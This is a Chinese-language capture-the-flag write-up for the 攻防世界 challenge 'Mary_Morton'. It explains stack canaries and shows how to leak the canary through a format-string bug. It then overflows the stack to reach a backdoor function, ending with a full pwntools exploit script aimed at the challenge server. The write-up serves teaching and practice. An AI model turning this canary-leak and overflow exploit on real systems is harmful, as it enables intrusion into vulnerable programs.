---
title: 攻防世界 Mary_Morton 关于canary
description: 攻防世界 Mary_Morton 关于canary-writeup
date: 2021-08-05 15:07:56
categories:
 - PWN
tags:
---

# 攻防世界 Mary_Morton 关于canary

由于格式化字符串我总是忘记，而且也没做过关于canary相关的题目，特此做此笔记

首先检查文件：

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628171936266-b915a12e-927b-449c-98f3-fc3ea804e631.png)

开了canary保护，拖进ida看看源码

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628171978999-7b075078-988a-4d16-8358-1704fae30651.png)

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628171999111-3ec8ce6c-285d-4155-bf43-8a6f91077114.png)

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628172011374-6555fe3f-a22b-411b-acba-4944675a8593.png)

其实就是两个漏洞，一个格式化字符串，一个栈溢出，这里可以考虑通过格式化字符串去泄露canary的值，然后再用栈溢出覆盖回去，本题提供了一个后门函数

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628172100519-aa7828a2-2da1-42c3-8280-37a646d2cd5e.png)

这里复习一下Canary保护，就是在栈里再添加一个变量，赋予随机值，这里看汇编fs:28h，这里好像是fs段寄存器0x28里存放着一个随机的保护值，如果这个变量在执行最后的leave ret的操作之前被修改了，则会调用__stack_chk_fail，直接报错

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628172156469-2d61005b-e384-4698-8153-423966fd967c.png)

那么第一步我们先通过格式化字符串看buf的偏移，这里偏移是6，那么偏移canary的变量v2就可以算了，首先buf是rbp-0x90，v2是rbp-0x8，那么buf和v2的之差就是0x88，又因为这个是64程序，一个单位占8字节，那么0x88除以8等于17，那么格式化字符串距离v2的偏移就是17+6=23个单位

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628173534920-ceb610ef-8785-49e1-9d57-84e5970e5c85.png)

那么就有

```python
from pwn import *

context.log_level = 'debug'

# p = process('./bin')
p = remote('111.200.241.244',55824)

backdoor = 0x00000000004008DA

payload = '%23$p'
p.sendlineafter('3. Exit the battle ','2')
p.sendline(payload)
p.recvuntil('0x')
canary = int(p.recv(16),16)
print(canary)

p.sendlineafter('3. Exit the battle ','1')
payload = 'A' * 0x88 + p64(canary) + p64(0xdeadbeef) + p64(backdoor)
p.sendline(payload)
p.interactive()
```